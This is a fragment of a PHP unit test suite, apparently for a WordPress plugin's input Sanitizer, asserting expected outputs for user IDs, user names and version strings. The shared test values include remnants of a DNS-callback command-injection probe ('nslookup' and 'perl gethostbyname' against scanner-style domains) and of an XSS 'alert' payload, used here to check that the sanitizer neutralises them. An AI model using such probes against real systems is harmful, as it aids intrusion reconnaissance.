            11 => 0,
            12 => 0,
            13 => 0,
            14 => 0,
            15 => 0,
            16 => 0,
            17 => 0,
            18 => 0,
            19 => 0,
            20 => 0,
            21 => 0,
            22 => 0,
            23 => 0,
            24 => 0,
            25 => 0,
            26 => 0,
            27 => $userId1,
        ]);
        $sanitized = $this->sanitize("user-id:{$userId2}", $values);
        $this->assertEquals($sanitized, [
            0 => $userId2,
            1 => $userId2,
            2 => $userId2,
            3 => $userId2,
            4 => $userId2,
            5 => $userId2,
            6 => $userId2,
            7 => $userId2,
            8 => $userId2,
            9 => $userId2,
            10 => $userId2,
            11 => $userId2,
            12 => $userId2,
            13 => $userId2,
            14 => $userId2,
            15 => $userId2,
            16 => $userId2,
            17 => $userId2,
            18 => $userId2,
            19 => $userId2,
            20 => $userId2,
            21 => $userId2,
            22 => $userId2,
            23 => $userId2,
            24 => $userId2,
            25 => $userId2,
            26 => $userId2,
            27 => $userId1,
        ]);
    }

    public function test_sanitize_user_ids()
    {
        self::factory()->user->create_many(2);
        $users = get_users(['fields' => 'ID']);
        $values = $this->testValues;
        $values[] = $users[0];
        $values[] = $users;
        $values[] = implode(',', $users);
        $values[] = array_diff([1,2,3,4,5,6,7,8,9], $users);
        $sanitized = $this->sanitize('user-ids', $values);
        $this->assertEquals($sanitized, [
            0 => [],
            1 => [],
            2 => array_intersect($users, array_map('intval', $values[2])),
            3 => [],
            4 => array_intersect($values[4], $users),
            5 => [],
            6 => array_intersect($values[6], $users),
            7 => [],
            8 => [],
            9 => [],
            10 => [],
            11 => [],
            12 => [],
            13 => [],
            14 => [],
            15 => [],
            16 => [],
            17 => [],
            18 => [],
            19 => [],
            20 => [],
            21 => [],
            22 => [],
            23 => [],
            24 => [],
            25 => [],
            26 => [],
            27 => [],
            27 => [$users[0]],
            28 => $users,
            29 => $users,
            30 => [],
        ]);
    }

    public function test_sanitize_user_name()
    {
        $values = $this->testValues;
        $values[] = 'Łukasz';
        $values[] = 'မောင်မောင် အောင်မျိုး ကိုကိုဦး မိုးမြင့်သန္တာ';
        $sanitized = $this->sanitize('user-name', $values);
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => '',
            11 => 'This is a title',
            12 => 'nslookup hit-gxwgukmocpc5c8dddd.comperl -e gethostbyname\'hissstgxwgukmocpc5c80.me\'',
            13 => 'June 13, 1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '李祖阳 xx xx',
            18 => 'axdextomorrow 200 200 peter',
            19 => 'this is true',
            20 => 'single-review full-width alert69',
            21 => 'mattwordpress.org',
            22 => 'httpswordpress.org',
            23 => 'wordpress.org',
            24 => 'www.wordpress.org',
            25 => 'httpswordpress.org',
            26 => '-1',
            27 => 'Łukasz',
            28 => 'မောင်မောင် အောင်မျိုး ကိုကိုဦး မိုးမြင့်သန္တာ',
        ]);
    }

    public function test_sanitize_version()
    {
        $values = $this->testValues;
        $values[] = 'v1.1.1';
        $values[] = 'v1';
        $values[] = '1.1.1.1';
        $values[] = '1.1.1';
        $values[] = '1.1.1a';
        $values[] = '1.1.beta';
        $values[] = '1.1.beta23';
        $values[] = '1.1..1beta23';
        $values[] = '1.1.1beta23';
        $values[] = '1.1.1-beta23';
        $sanitized = $this->sanitize('version', $values);
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => '',
            15 => '',
            16 => '2020',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => '',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => '',
            27 => '',
            28 => '',
            29 => '',
            30 => '1.1.1',
            31 => '',
            32 => '',
            33 => '',
            34 => '',
            35 => '',
            36 => '1.1.1-beta23',
        ]);
    }

    protected function sanitize(string $sanitizer, array $values = [])
    {
        if (empty($values)) {
            $values = $this->testValues;
        }
        $sanitizers = array_fill_keys(array_keys($values), $sanitizer);
        return (new Sanitizer($values, $sanitizers))->run();
    }
}
